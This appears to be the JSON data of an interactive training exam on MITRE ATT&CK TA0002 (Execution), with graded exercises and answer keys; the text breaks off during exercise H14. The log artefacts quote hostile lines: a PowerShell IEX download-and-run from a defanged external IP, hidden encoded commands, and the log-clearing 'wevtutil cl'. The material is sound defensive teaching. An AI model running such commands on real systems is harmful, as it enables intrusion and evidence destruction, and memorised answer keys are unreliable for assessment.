<script type="application/json" id="exam-data">{"config":{"objectId":"TA0002","introTitle":"MITRE ATT&CK TA0002 — Execution","severity":"HARD","difficulty":"hard","batch":3,"title":"TA0002 Execution — HARD","minutes":45,"seconds":2700},"intro":{"entityHtml":"\u003ch2>What you will learn\u003c/h2>\u003cp>Welcome! This exam is about one part of the MITRE ATT&CK framework: the tactic called \u003cb>Execution\u003c/b>, with the ID \u003cb>TA0002\u003c/b>. You will learn what it is, why it matters, and how real security teams work with it every day.\u003c/p>\u003ch3>What is MITRE ATT&CK?\u003c/h3>\u003cp>MITRE ATT&CK is a big, public knowledge base. It describes what real attackers do, step by step. ATT&CK splits an attack into goals called \u003cb>tactics\u003c/b>. Every tactic has an ID that starts with \u003cb>TA\u003c/b>. Every way to reach a goal is called a \u003cb>technique\u003c/b>. Technique IDs start with \u003cb>T\u003c/b>.\u003c/p>\u003ch3>What is Execution (TA0002)?\u003c/h3>\u003cp>This object is a \u003cb>Tactic\u003c/b> — a goal, not a single action. The goal of TA0002 is simple: \u003cb>run attacker code on a target system\u003c/b>. Imagine an attacker sends an email with a bad attachment. An employee opens it. The attachment runs a script. At that moment the attacker has reached Execution: their code now runs inside the company. Before this step, the attacker often only has a document, a link, or a network position. After this step, their commands run on a real machine.\u003c/p>\u003cp>Execution usually comes right after \u003cb>Initial Access (TA0001)\u003c/b> and before \u003cb>Persistence (TA0003)\u003c/b>. Almost every serious attack needs this step. If defenders stop Execution, the attack usually stops too.\u003c/p>\u003ch3>Techniques that live under TA0002\u003c/h3>\u003cp>ATT&CK lists many ways to reach this goal. The best-known ones are: \u003cb>Command and Scripting Interpreter (T1059)\u003c/b> — for example PowerShell, Windows Command Shell, Unix Shell, AppleScript or Python; \u003cb>Windows Management Instrumentation (T1047)\u003c/b>; \u003cb>Scheduled Task/Job (T1053)\u003c/b>; \u003cb>User Execution (T1204)\u003c/b> — when a person opens a bad link or file; \u003cb>Exploitation for Client Execution (T1203)\u003c/b>; \u003cb>System Services (T1569)\u003c/b>; \u003cb>Inter-Process Communication (T1559)\u003c/b>; \u003cb>Hijack Execution Flow (T1574)\u003c/b>; \u003cb>Trusted Developer Utilities Proxy Execution (T1127)\u003c/b>; \u003cb>Native API (T1106)\u003c/b>; \u003cb>Software Deployment Tools (T1072)\u003c/b>; \u003cb>Shared Modules (T1129)\u003c/b>; \u003cb>Deploy Container (T1610)\u003c/b>; and \u003cb>Serverless Execution (T1648)\u003c/b>. Some techniques also serve other tactics — a scheduled task, for example, can execute code now (Execution) or start it again after a reboot (Persistence).\u003c/p>\u003ch3>Where is it used in real work?\u003c/h3>\u003cul>\u003cli>\u003cb>SOC analysts\u003c/b> see Execution alerts every day, for example: an Office program started PowerShell. They decide if it is an attack.\u003c/li>\u003cli>\u003cb>Threat hunters\u003c/b> search logs for attacker scripts: PowerShell script block logging (event 4104), process creation (4688), task creation (4698), service installs (7045).\u003c/li>\u003cli>\u003cb>Incident responders\u003c/b> stop running code, collect evidence, and clean systems.\u003c/li>\u003cli>\u003cb>Detection engineers\u003c/b> write rules for these events, for example: alert when a browser or Office app spawns a script interpreter.\u003c/li>\u003cli>\u003cb>Red teamers\u003c/b> use the same techniques (with written permission) to test defences.\u003c/li>\u003cli>\u003cb>GRC analysts and control owners\u003c/b> use TA0002 to justify controls like application allowlisting, exploit protection and user training.\u003c/li>\u003cli>\u003cb>Threat intelligence analysts\u003c/b> map adversary reports to TA0002 when they brief the CISO.\u003c/li>\u003c/ul>\u003ch3>What risks does it address?\u003c/h3>\u003cp>If you do not understand Execution, you miss the moment an attacker takes control of a machine. Files and network traffic can look normal, but one running script can steal data or start ransomware. That is why this tactic is one of the most important to master.\u003c/p>","rulesHtml":"\u003ch3>Difficulty of this file: HARD\u003c/h3>\u003cp>Challenging. Two to three concepts interact per exercise, artefacts must be correlated, and near-miss answers defend themselves in other contexts. The obvious answer is sometimes wrong on purpose.\u003c/p>\u003ch3>Exercise types you will meet\u003c/h3>\u003cp>Multiple-choice questions, multi-select questions with partial credit, matching, drag-and-drop placement of techniques, ordering, fill-in-the-blank with a word bank, priority ranking, short branching scenarios, a log viewer with a filter box, and one small command-line lab.\u003c/p>\u003ch3>Scoring (please read — it helps you)\u003c/h3>\u003cul>\u003cli>Each exercise gives at most 1 point of credit. You pass with \u003cb>70%\u003c/b> over the exercises you answer.\u003c/li>\u003cli>Multi-item exercises (several correct options, several slots, several steps) give \u003cb>partial credit\u003c/b>: every correct item counts, but every wrong item subtracts. Selecting everything is worth 0, so only pick what you are sure of.\u003c/li>\u003cli>A partially correct answer still earns credit — for example 3 of 5 correct items give credit 0.60.\u003c/li>\u003c/ul>\u003ch3>Check buys you unlimited thinking time\u003c/h3>\u003cp>When you press \u003cb>Check\u003c/b>, the timer stops by itself. The feedback stays visible and you can study it as long as you want. The timer only runs again when you press \u003cb>Next\u003c/b> (or Final Submit on the last exercise). This is shown as “PAUSED — reviewing feedback”.\u003c/p>\u003ch3>Manual pause\u003c/h3>\u003cp>The \u003cb>Pause\u003c/b> button stops the timer for a real break. While it is paused, the exercise is hidden so nobody can read it. Press \u003cb>Resume\u003c/b> to continue.\u003c/p>\u003ch3>Skipping\u003c/h3>\u003cul>\u003cli>Every exercise has a \u003cb>Skip\u003c/b> button. Skipping hides the answer and moves the exercise to a review pool. The timer keeps running.\u003c/li>\u003cli>Before the exam ends you get a \u003cb>review screen\u003c/b> where you can answer skipped exercises as often as you like while time remains.\u003c/li>\u003cli>Skipped exercises that stay unanswered are \u003cb>excluded\u003c/b> from the score — they count neither for nor against you.\u003c/li>\u003c/ul>\u003ch3>Hints\u003c/h3>\u003cp>One hint per exercise. A hint costs \u003cb>−10% of that exercise’s credit\u003c/b> (never more). It gives a nudge, not the answer.\u003c/p>\u003ch3>Retake\u003c/h3>\u003cp>After the results screen you can retake the exam. Questions and answer choices are shuffled again.\u003c/p>"},"keywords":[{"theme":"Tactic objective & lifecycle position","chips":["Run attacker code on target","TA0002 = Execution","Follows Initial Access (TA0001)","Precedes Persistence (TA0003)","Adversary goal, not one action"]},{"theme":"Execution techniques & sub-techniques","chips":["T1059 Command and Scripting Interpreter","T1059.001 PowerShell","T1059.003 Windows Command Shell","T1059.004 Unix Shell","T1059.002 AppleScript","T1047 WMI","T1053 Scheduled Task/Job","T1053.005 Scheduled Task","T1204.001 Malicious Link","T1204.002 Malicious File","T1203 Exploitation for Client Execution","T1569.002 Service Execution","T1106 Native API","T1127.001 MSBuild","T1559 Inter-Process Communication","T1574 Hijack Execution Flow","T1072 Software Deployment Tools","T1129 Shared Modules","T1610 Deploy Container","T1648 Serverless Execution"]},{"theme":"Platforms & permissions","chips":["Windows","macOS","Linux","Containers","IaaS / Cloud","User vs administrator rights"]},{"theme":"Data sources & telemetry","chips":["Process creation (4688)","Script block logging (4104)","Module logging (4103)","Task creation (4698)","Service install (7045)","Sysmon process events","WMI activity logs","EDR telemetry"]},{"theme":"Detection logic & analytics","chips":["Office app spawning interpreter","Encoded command hunting","Parent-child process anomalies","Service created off-hours","Task registered at logon"]},{"theme":"Mitigations & controls","chips":["M1038 Execution Prevention","M1040 Behavior Prevention on Endpoint","M1017 User Training","M1049 Antivirus / Antimalware","M1050 Exploit Protection","M1026 Privileged Account Management","M1021 Restrict Web-Based Content"]},{"theme":"Adversary use & tooling","chips":["APT29","Lazarus","FIN7","Wizard Spider","OilRig","APT41","Cobalt Strike","PowerShell Empire","Metasploit"]}],"exercises":[{"id":"H01","type":"qcm-multi","summary":"Correlation drill — which conclusions does this evidence actually support?","scenario":["22:52. You inherit a case with two artefacts from HOST-FIN-01. Legal may get involved, so only conclusions the evidence directly supports may go into the ticket."],"artefacts":[{"label":"ARTEFACT 1 — PowerShell + Security log, HOST-FIN-01 (filterable)","kind":"log","filter":true,"lines":["22:41:11  Event 4688  parent WINWORD.EXE → child powershell.exe -nop -w hidden -enc AAAA…","22:41:29  Event 4104  \"IEX(New-Object Net.WebClient).DownloadString('hxxp://185[.]199[.]10[.]44/p[.]ps1')\"","22:42:03  Event 4688  parent explorer.exe → child notepad.exe (user j.mayer)","22:43:44  Event 4688  parent winword.exe → child powershell.exe  (cmdline: Get-Date; add-in: HelpdeskTools)"]},{"label":"ARTEFACT 2 — Case note from shift lead","kind":"text","body":["Ticket #5519: possible lure execution on finance host. Two Word-spawned PowerShell instances seen 22:41 and 22:43. Keep wording defensible."]}],"question":"Select EVERY conclusion the evidence directly supports.","hint":"Two Word-spawned PowerShell runs are not identical — read the command lines. And check what the evidence never mentions.","explanation":"Supported: the \u003cb>hidden encoded run at 22:41\u003c/b> is a lure-execution pattern (T1059.001); the \u003cb>22:43 run is benign helpdesk add-in traffic\u003c/b> and belongs in the ticket as a documented false-positive source; and the \u003cb>4104 line proves an IEX download\u003c/b> from an external address. Not supported: nothing shows WMI (T1047), and notepad starting at 22:42 proves no persistence at all. Defensible tickets separate the malicious run from the benign look-alike — that is what makes them survive review.","study":"Correlating 4688 lineages with 4104 content; separating near-identical parent-child pairs.","data":{"options":[{"t":"The payload was downloaded via IEX from an external address","correct":true,"why":"The 4104 text shows the download from 185[.]199[.]10[.]44."},{"t":"A Word document started hidden, encoded PowerShell — likely T1059.001","correct":true,"why":"The 22:41 lineage plus encoded content supports exactly this."},{"t":"The 22:43 Word-spawned PowerShell is benign helpdesk add-in traffic","correct":true,"why":"Get-Date from a known add-in is the false-positive source the rule will keep meeting."},{"t":"The attacker used WMI (T1047) to start the payload on HOST-FIN-01","why":"No WMI activity appears anywhere in the artefacts."},{"t":"The 22:42 notepad start proves a scheduled task persisted (T1053)","why":"A user opening notepad neither persists nor proves anything about tasks."}]}},{"id":"H02","type":"categorize","summary":"Intent mapping — same techniques, three tactic columns, intent decides","scenario":["The IR lead pins six behaviour cards on the board. “Same technique can sit in different tactics depending on WHY it happened,” she says. “Read the intent note on each card before you place it.”"],"artefacts":[{"label":"ARTEFACT — Intent notes from the board","kind":"text","body":["Card wording carries the intent: a one-shot run serves Execution; anything whose job is coming back serves Persistence; anything that raises the attacker’s rights serves Privilege Escalation."]}],"question":"Place every behaviour into the tactic column its intent points to.","hint":"Ask three questions: did it run now, will it come back, did it gain rights?","explanation":"One-shot /run of malware.exe and a service created purely to execute the payload now, plus msbuild running an inline C# payload, are all \u003cb>Execution\u003c/b> — the goal was the run itself. A task re-created every logon and a boot-start service exist to \u003cb>return\u003c/b> — Persistence. A task created with /rl HIGHEST to break out of a medium-integrity limit is about \u003cb>rights\u003c/b> — Privilege Escalation. T1053 and services are the classic chameleons: the artifact is identical, the intent is not.","study":"How T1053 and services change tactic membership with attacker intent.","data":{"zones":[{"title":"Execution (TA0002)"},{"title":"Persistence (TA0003)"},{"title":"Privilege Escalation (TA0004)"}],"items":[{"t":"schtasks /run launched malware.exe once at 14:02","target":0,"why":"A one-shot run serves Execution."},{"t":"Task re-created at every logon to relaunch the implant","target":1,"why":"Recurrence for survival is Persistence."},{"t":"Task created with /rl HIGHEST to bypass a medium-integrity limit","target":2,"why":"The gain is higher rights — Privilege Escalation."},{"t":"Service HealthCore created solely to execute the payload now","target":0,"why":"Service used for the immediate run — Execution (T1569.002)."},{"t":"Boot-start service brings the implant up at every reboot","target":1,"why":"Surviving reboots is Persistence."},{"t":"msbuild.exe executed an unsigned inline C# project","target":0,"why":"Trusted developer utility proxying payload execution — Execution (T1127.001)."}]}},{"id":"H03","type":"qcm","summary":"Lineage discrimination — what does wmiprvse spawning PowerShell mean?","scenario":["From HOST-SQL-05 you have two 4688 lines. Line 1: parent wmiprvse.exe → child powershell.exe -enc AAAA…. Line 2: parent services.exe → child cmd.exe /c script.vbs. Your junior says both are “just PowerShell and cmd starting — nothing to map”."],"artefacts":[{"label":"ARTEFACT — Two process lineages","kind":"log","lines":["Line 1:  parent wmiprvse.exe → child powershell.exe -enc AAAA…","Line 2:  parent services.exe → child cmd.exe /c script.vbs"]}],"question":"Which mapping is correct for LINE 1?","hint":"Which parent process is the WMI service host — and what technique abuses that service to run things?","explanation":"\u003cb>The T1047 mapping is correct.\u003c/b> wmiprvse.exe is the WMI service host; when it spawns an interpreter, code arrived through WMI — T1047 Execution. \u003cb>The T1543.003 choice\u003c/b> is the classic near-miss: Windows Service is about creating/modifying services for persistence — no service creation is shown here. \u003cb>The T1053.005 choice\u003c/b> needs task-scheduler evidence that is absent. \u003cb>The T1072 choice\u003c/b> needs a deployment platform (SCCM and friends), also absent. Line 2 would map to T1569.002 (Service Execution) — but that is not what the question asks.","study":"Parent process meaning: wmiprvse → T1047, services.exe → T1569.002.","data":{"options":[{"t":"wmiprvse spawning PowerShell = T1543.003 Windows Service (Persistence)","why":"Defensible when a service is created — but no service creation appears here."},{"t":"wmiprvse spawning PowerShell = T1072 Software Deployment Tools","why":"That needs a deployment platform such as SCCM — not shown."},{"t":"wmiprvse spawning PowerShell = T1047 WMI Execution","correct":true,"why":"Correct — the WMI service host spawned the interpreter: code came via WMI."},{"t":"wmiprvse spawning PowerShell = T1053.005 Scheduled Task","why":"Tasks leave 4698/task evidence — none is present."}]}},{"id":"H04","type":"flow","summary":"Finance server incident — three decisions with real cost","scenario":["21:40. EDR shows FIN-SRV-03 (production finance file server) running powershell -enc spawned by WINWORD. The payments batch is scheduled for 23:00. Three decisions are yours tonight."],"artefacts":[{"label":"ARTEFACT — EDR process card","kind":"log","lines":["21:38:02  WINWORD.EXE → powershell.exe -nop -w hidden -enc AAAA…  (FIN-SRV-03, user svc-invoice)","21:38:44  powershell.exe → outbound attempt, destination not resolved"]}],"question":"Take all three decisions in order.","hint":"Active encoded execution on a production server comes first; evidence comes before cleanup; a live downloader beats one missed batch.","explanation":"Step 1: isolate the host — active encoded execution on production beats waiting. Step 2: capture the script text and payload hash \u003cb>before\u003c/b> any cleanup, or the evidence is gone. Step 3: with a live downloader confirmed, isolation now (accepting the missed 23:00 batch) is the correct call; the cost is real and must be documented — that is exactly the trade-off senior responders own. Deleting payload files destroys evidence, and standing still while a downloader phones home risks the whole domain.","study":"Containment vs business cost; evidence before remediation.","data":{"steps":[{"text":["Decision 1 — your first move on FIN-SRV-03:"],"options":[{"t":"Delete the PowerShell history files","why":"Destroying evidence first is the cardinal responder error."},{"t":"Isolate FIN-SRV-03 from the network via EDR","correct":true,"why":"Stops the run and any callback while you think."},{"t":"Restart the server to clear memory","why":"A reboot wipes volatile evidence and may re-trigger tasks."}]},{"text":["Decision 2 — the encoded command decoded to a downloader. Next:"],"options":[{"t":"Email file-server users to be careful","why":"Awareness mail is fine later; it is not triage."},{"t":"Run a full antivirus scan and close the case","why":"A scan without capture loses the payload and the context."},{"t":"Capture the script text and downloaded file hash before cleanup","correct":true,"why":"Evidence first — you cannot analyse what you deleted."}]},{"text":["Decision 3 — the CISO asks: isolation costs the 23:00 payments batch. It is 21:40."],"options":[{"t":"Take no action tonight","why":"The downloader may stage ransomware — standing still is the costly option."},{"t":"Isolate now, accept the missed batch, document the decision","correct":true,"why":"A live downloader on the finance server outweighs one batch; the decision is recorded."},{"t":"Delete the payload files only, keep the host online","why":"Destroys evidence while the attacker may still hold access."}]}]}},{"id":"H05","type":"order","summary":"Playbook ordering — sequence the responder actions for a live execution incident","scenario":["A new responder shuffled the playbook cards for a live Execution-stage incident on one host. Put the five actions back into the correct order."],"artefacts":[],"question":"Drag the five responder actions into the correct order.","hint":"Understand, contain, preserve, remove, report — in that spirit.","explanation":"Order: (1) confirm scope from the alert — what host, what user, what ran; (2) isolate the host so nothing new executes or leaves; (3) collect volatile evidence — processes, script text, task list — before anything changes; (4) remove the execution artefacts (task, service, files) once evidence is safe; (5) report to management and update detections so the same technique is caught faster. Acting before understanding and deleting before collecting are the two classic responder mistakes this order prevents.","study":"The responder workflow for Execution-stage incidents.","data":{"items":[{"t":"Review the alert details and confirm scope (host, user, command)","why":"Understanding comes first — you must know what you are containing."},{"t":"Isolate the affected host at the network level","why":"Containment stops further execution and callbacks."},{"t":"Collect volatile evidence: processes, script text, task list","why":"Volatile data dies at reboot — capture it while isolated but powered."},{"t":"Remove the execution artefacts (task, service, files)","why":"Cleanup only after evidence is safe."},{"t":"Report to management and update the detections","why":"Close the loop: leadership informed, rules improved."}]}},{"id":"H06","type":"fill","summary":"Rule card — complete the SIEM rule EX-014 description","scenario":["You finalise the wiki card for SIEM rule EX-014. Fill every gap from the box."],"artefacts":[],"question":"Choose the correct fragment for each gap.","hint":"Parent: an Office application. Child: the interpreter. Flag: the encoded-command switch. Tactic: TA0002.","explanation":"EX-014 fires when an Office application parents powershell.exe and the command line carries -enc (or its long form -EncodedCommand) — mapped to TA0002. The distractors are plausible elsewhere: chrome.exe belongs to browser chains, -noni is a harmless window flag, TA0003 would need recurrence, and the spooler is unrelated. Naming the exact flag keeps the rule tight and the false-positive rate low.","study":"Detection engineering: precise parents, children and flags; correct tactic mapping.","data":{"textWithBlanks":"Rule EX-014 fires when the parent process is {1} and the child is {2} with the flag {3} in the command line. The rule maps to tactic {4} in ATT&CK.","blanks":[{"answer":"an Office application","why":"Office parenting an interpreter is the lure-execution signature."},{"answer":"powershell.exe","why":"The interpreter child in this rule is PowerShell."},{"answer":"-enc (or -EncodedCommand)","why":"The encoded-command flag is the hiding tell this rule keys on."},{"answer":"TA0002 (Execution)","why":"One-shot code execution from a lure is Execution."}],"bank":["chrome.exe","cmd.exe","-noni","TA0003 (Persistence)","the printer spooler"]}},{"id":"H07","type":"match","summary":"CTI cards — match each group to its publicly known Execution behaviour","scenario":["The CTI team pins four adversary cards on the board for the quarterly briefing. Match each group to the Execution behaviour it is publicly reported to use."],"artefacts":[],"question":"Match each group to its documented Execution behaviour.","hint":"One loves WMIC, one shipped a fake update with AppleScript, one lives in PowerShell and tasks, one sends macro and LNK lures.","explanation":"Wizard Spider is publicly documented using WMIC to execute payloads on remote systems (T1047). Lazarus used AppleScript inside a fake cryptocurrency update in Operation AppleJeus (T1059.002). APT29 is known for heavy PowerShell use plus scheduled tasks for tooling (T1059.001, T1053.005). FIN7 drove user execution with macro documents and LNK lures (T1204, T1059.001). These public profiles make the techniques strong detection anchors: telemetry tuned to them catches more than one actor.","study":"Real-world procedure examples: which groups use which TA0002 techniques.","data":{"zones":[{"title":"Wizard Spider"},{"title":"Lazarus"},{"title":"APT29"},{"title":"FIN7"}],"items":[{"t":"Used WMIC to launch payloads on remote systems","target":0,"why":"Publicly reported WMI execution — T1047."},{"t":"Used AppleScript payloads in a fake crypto update (Operation AppleJeus)","target":1,"why":"Documented macOS script execution — T1059.002."},{"t":"Heavy PowerShell use plus scheduled tasks for tooling","target":2,"why":"Their signature interpreter and task pair — T1059.001 + T1053.005."},{"t":"Macro-laced documents and LNK lures driving user execution","target":3,"why":"Their lures ride on T1204 and T1059.001."}]}},{"id":"H08","type":"qcm","summary":"Looks alarming — disposition of a scheduled reporting script","scenario":["09:15. An alert fired: “Suspicious script execution — taskeng.exe → powershell.exe on RPT-01.” The 4104 text reads: Get-ADUser -Filter * -Properties LastLogonDate | Export-Csv C:\\Reports\\stale-ads.csv. The creating account is svc-reportwriter, and ticket #8841 (opened Monday) says: ‘roll out new AD staleness report’."],"artefacts":[{"label":"ARTEFACT — Alert context","kind":"log","lines":["09:02:11  Event 4688  parent taskeng.exe → child powershell.exe (RPT-01)","09:02:12  Event 4104  ScriptBlock: Get-ADUser -Filter * -Properties LastLogonDate | Export-Csv C:\\Reports\\stale-ads.csv","Ticket #8841: new AD staleness report rollout — owner: svc-reportwriter"]}],"question":"What is the correct disposition?","hint":"A scheduled task, a known service account, a matching ticket, and a read-only AD query — what does that add up to?","explanation":"\u003cb>Likely benign scheduled reporting is correct.\u003c/b> Scheduled trigger + known service account + matching change ticket + read-only script = likely benign, and the rule should be tuned (for example allow-list svc-reportwriter’s script hash). \u003cb>Isolating RPT-01\u003c/b> over a read-only AD query is overkill. \u003cb>Disabling the account\u003c/b> breaks the report and is not a first move. \u003cb>Escalating a matched, ticketed activity\u003c/b> as intrusion burns credibility. The HARD lesson: alarming shape is not the same as malicious substance — but document the correlation so the next analyst sees it instantly.","study":"The ‘looks alarming, is benign’ pattern: task context, accounts, and change tickets.","data":{"options":[{"t":"Escalate the alert as a confirmed intrusion","why":"Nothing corroborates intrusion — the ticket and account do."},{"t":"Likely benign scheduled reporting — document and tune","correct":true,"why":"Task + service account + ticket + read-only script line up as legitimate."},{"t":"Disable svc-reportwriter and stop the task now","why":"Breaks a legitimate report before the analysis is done."},{"t":"Isolate RPT-01 from the network immediately","why":"A read-only, ticketed report does not justify isolation."}]}},{"id":"H09","type":"rank","summary":"Triage ranking — order four execution alerts by urgency","scenario":["Four execution alerts landed during a Brown-out. Rank them 1–4 (1 = work first). Signals, host value and business cost all matter."],"artefacts":[],"question":"Assign the correct priority rank to each alert.","hint":"Domain controller with encoded execution first; finance server service second; dev-laptop task third; a Get-Help script last.","explanation":"Rank 1: encoded PowerShell on the \u003cb>domain controller\u003c/b> — crown jewel, strongest signal. Rank 2: a \u003cb>new service on the finance server\u003c/b> running encoded PowerShell — strong signal, high value, slightly less central than the DC. Rank 3: an encoded task on a \u003cb>dev laptop\u003c/b> — real signal, lower asset value. Rank 4: Word spawning PowerShell that only runs \u003cb>Get-Help\u003c/b> on an HR laptop — weakest signal, likely a test or training script. Ranking blends execution-signal strength with asset criticality, the way a senior queue-owner does it.","study":"Prioritisation across mixed execution signals and asset values.","data":{"items":[{"t":"powershell -enc from WINWORD on HOST-DC-02 (domain controller)","rank":1,"why":"Crown-jewel host, strongest signal — first."},{"t":"New service WinDefendUpd runs cmd /c powershell -enc on FIN-SRV-03","rank":2,"why":"Service-based execution on a critical server — second."},{"t":"schtasks created task Upd running powershell -enc on DEV-LAP-21","rank":3,"why":"True signal, but a dev laptop ranks below server-tier hosts."},{"t":"WINWORD spawned powershell.exe running Get-Help on HR-LAP-08","rank":4,"why":"Get-Help is inert documentation lookup — lowest urgency."}]}},{"id":"H10","type":"terminal","summary":"Legal hold — read task-creation events from HOST-FS-03 without changing anything","scenario":["Legal has placed the incident under hold. Your objective, stated by the counsel on the bridge: “Read the scheduled-task creation events from HOST-FS-03’s Security log, in readable text, right now — and change nothing on that host.” Evidence rules apply: anything destructive is a career-ending event. Choose the right Windows tool and flags yourself; nobody will name them for you."],"artefacts":[{"label":"ARTEFACT — Counsel’s constraints","kind":"text","body":["Read-only. Readable text output. Task-creation events only (Security log, event 4698). The host is live; the clock is running."]}],"question":"Type the command that queries the Security log on HOST-FS-03 for event 4698 in text form without changing anything, then press Run.","hint":"Think about which tool reads Windows event logs, which action queries events rather than clearing them, and how you filter to one event ID.","explanation":"The canonical command is \u003cb>wevtutil qe Security /q:\"*[System[(EventID=4698)]]\" /f:text\u003c/b>. \u003cb>wevtutil\u003c/b> is the Windows event log utility. \u003cb>qe\u003c/b> means query events — read-only. \u003cb>Security\u003c/b> names the log. The \u003cb>/q:\u003c/b> XPath filter selects event 4698 (task creation — the T1053.005 artefact). \u003cb>/f:text\u003c/b> renders human-readable output. The trap: \u003cb>wevtutil cl\u003c/b> clears a log — it would have destroyed the very evidence legal demands, and it is exactly the attacker’s move (event 1102). Near-miss: forgetting /f:text gives XML soup that wastes bridge time.","study":"wevtutil query actions vs destructive actions; the 4698 event for T1053.005.","data":{"prompt":"PS C:\\Users\\ir01>","banner":["CyberPulse IR bridge — ADMIN-WS-2","Legal hold active on incident #5519. Target: HOST-FS-03 (reachable)."],"simMatch":"^wevtutil\\b.*\\bqe\\b","sim":["Event[0]:","  Log Name:   Security","  Event ID:   4698","  Task Name:  SysUpdate    Author: S-1-5-21-…-1107","  Command:    powershell -nop -w hidden -enc AAAA…","Event[1]:","  Log Name:   Security","  Event ID:   4698","  Task Name:  CacheSweep   Author: S-1-5-21-…-1107"],"elements":[{"re":"^wevtutil\\b","label":"Tool: wevtutil (you chose the event-log tool)","why":"The built-in Windows event log utility."},{"re":"\\bqe\\b","label":"Action: qe (query events — read-only)","why":"qe reads events; nothing on the host changes."},{"re":"\\bsecurity\\b","label":"Log: Security","why":"Task-creation audits live in the Security log."},{"re":"eventid=4698","label":"Filter: EventID 4698 (task creation)","why":"Narrows the query to exactly the T1053.005 artefact."},{"re":"\\/f:text","label":"Format: /f:text (readable output)","why":"Counsel asked for readable text, not raw XML."}],"danger":[{"re":"\\bcl\\b","label":"DESTRUCTIVE: cl would clear the log","why":"wevtutil cl deletes log content — that destroys evidence under legal hold (and matches attacker event 1102)."},{"re":"\\bdel\\b|\\bremove\\b","label":"State-changing action detected","why":"The constraint was read-only; this command would modify the host."}],"canonical":"wevtutil qe Security /q:\"*[System[(EventID=4698)]]\" /f:text"}},{"id":"H11","type":"categorize","summary":"Anchor or evade — sort detection anchors from evasion moves","scenario":["You run the blue/red debrief of the quarter. Six statements go up on the wall. Sort each into: a defender’s detection anchor, or an attacker’s evasion move."],"artefacts":[],"question":"Drag each statement to its side: detection anchor (blue) or evasion move (red).","hint":"Anchors observe behaviour; evasion moves avoid being seen or misdirect the observer.","explanation":"Anchors: parent-child chains (Office → interpreter), host-wide 4104 collection, and correlating 7045 service installs with script logs — all observe behaviour that is hard to fake without stopping. Evasion moves: msbuild as a LOLBin to dodge powershell.exe sightings, -enc/Base64 to hide intent, and WMI execution so no cmd.exe lineage appears — all reduce telemetry quality without changing the goal. Every anchor on the left partially defeats every move on the right, which is why debriefs pair them explicitly.","study":"Detection anchors vs evasion moves for TA0002 techniques.","data":{"zones":[{"title":"Defender: detection anchor"},{"title":"Attacker: evasion move"}],"items":[{"t":"Alert on Office → interpreter parent-child chains","target":0,"why":"The lineage anchor catches most lure execution."},{"t":"Use msbuild.exe to run payloads instead of powershell.exe","target":1,"why":"LOLBin proxy (T1127.001) hides from interpreter alerts."},{"t":"Ship Base64 -enc commands to hide intent","target":1,"why":"Encoding hides the command from naive string rules."},{"t":"Collect 4104 script text host-wide","target":0,"why":"Script text survives encoding — the strongest content anchor."},{"t":"Run the payload through WMI so no cmd.exe appears","target":1,"why":"WMI execution (T1047) changes the lineage defenders expect."},{"t":"Correlate service installs (7045) with script logs","target":0,"why":"Cross-event correlation is a durable anchor."}]}},{"id":"H12","type":"qcm","summary":"Mapping dispute — service ran the payload: which technique wins?","scenario":["Dispute in the review. Artefacts from HOST-DC-02: event 7045 shows service HealthCore created 02:14 by srv-setup, path cmd /c powershell -enc; event 4688 shows services.exe → cmd.exe → powershell.exe at 02:14; no other run of the payload exists in telemetry."],"artefacts":[{"label":"ARTEFACT — The three lines in dispute","kind":"log","lines":["02:14:03  Event 7045  Service installed: HealthCore  Path: cmd.exe /c powershell -enc AAAA…  (by srv-setup)","02:14:09  Event 4688  services.exe → cmd.exe /c …","02:14:11  Event 4688  cmd.exe → powershell.exe -nop -enc AAAA…"]}],"question":"Which ATT&CK mapping best describes the moment the payload RAN at 02:14?","hint":"Follow the run event, not the config event. What actually executed the code at 02:14?","explanation":"\u003cb>T1569.002 Service Execution is correct.\u003c/b> The service binary executed the payload at 02:14 — that moment is T1569.002 (TA0002). \u003cb>The T1543.003 choice\u003c/b> is the seductive near-miss: Windows Service is right when the service exists to persist across boots; here there is exactly one run and no boot evidence, so the run belongs to TA0002. \u003cb>The T1053.005 choice\u003c/b> needs task-scheduler evidence, which does not exist. \u003cb>The T1059.001-only choice\u003c/b> names the interpreter but ignores the delivery vector the question asks about. Config events (creation) and run events (execution) point at different tactics — read the run.","study":"T1569.002 vs T1543.003: the run-now vs come-back-later split.","data":{"options":[{"t":"T1059.001 only — the interpreter is all that matters","why":"PowerShell ran, but the execution vector the question asks for is the service."},{"t":"T1543.003 Windows Service (Persistence) — creation alone proves persistence","why":"Defensible for boot-surviving services; here the evidence shows one run only."},{"t":"T1569.002 Service Execution (TA0002) — the service executed the payload","correct":true,"why":"Correct — the run moment came through the service binary."},{"t":"T1053.005 Scheduled Task — a task was involved","why":"No task artefact exists in the evidence."}]}},{"id":"H13","type":"fill","summary":"Responder note — complete the two evidence sentences","scenario":["You write the responder note that goes to the handover pack. Two gaps must be closed with precise words."],"artefacts":[],"question":"Choose the correct fragment for each gap.","hint":"The execution came through an interpreter started by an Office process; the script-text evidence is 4104.","explanation":"The note must say execution happened via PowerShell (T1059.001) started by an Office process, and that script-text evidence (event 4104) was exported before remediation. The distractors would change the meaning: WMI (T1047) would need wmiprvse lineage, 4698/7045 would claim task or service evidence that this case does not have, and cron is Linux-only.","study":"Writing defensible notes: technique, lineage and event ID must all agree.","data":{"textWithBlanks":"The responder note must say: execution happened via {1} started by an Office process; we preserved evidence by exporting event {2} logs before remediation.","blanks":[{"answer":"PowerShell (T1059.001)","why":"The interpreter in this case is PowerShell."},{"answer":"4104","why":"Script block logging carries the executed script text."}],"bank":["WMI (T1047)","4698","7045","Cron (T1053.003)"]}},{"id":"H14","type":"qcm-multi","summary":"Coverage review — which gaps belong in the ATT&CK-aligned report?","scenario":["The security review compares current controls against TA0002. Current state: EDR process telemetry on all endpoints; script block logging on servers only; no application allowlisting anywhere; user awareness training runs once a year."],"artefacts":[{"label":"ARTEFACT — Current control state","kind":"table","rows":[["Control","Status"],["EDR process telemetry","All endpoints"],["Script block logging (4104)","Servers only"],["Application allowlisting (M1038)","Not deployed"],["User training (M1017)","Annual, classroom"]]}],"question":"Select EVERY gap the ATT&CK-aligned review should report for Execution coverage.","hint":"Workstation scripts, prevention, and once-a-year training are the weak points. BitLocker and egress rules answer other questions.","explanation":"Reported gaps: \u003cb>4104 on workstations only-servers\u003c/b> weakens T1059.001 detection where lures actually land; \u003cb>no M1038 allowlisting\u003c/b> leaves T1059/T1106/T1127 abuse un-prevented; and \u003cb>annual-only training\u003c/b> leaves T1204 user execution largely untreated between sessions. Not gaps for TA0002: egress firewall rules address Command and Control, not execution, and BitLocker is disk encryption — neither belongs in this chapter. Coverage reviews stay on the tactic 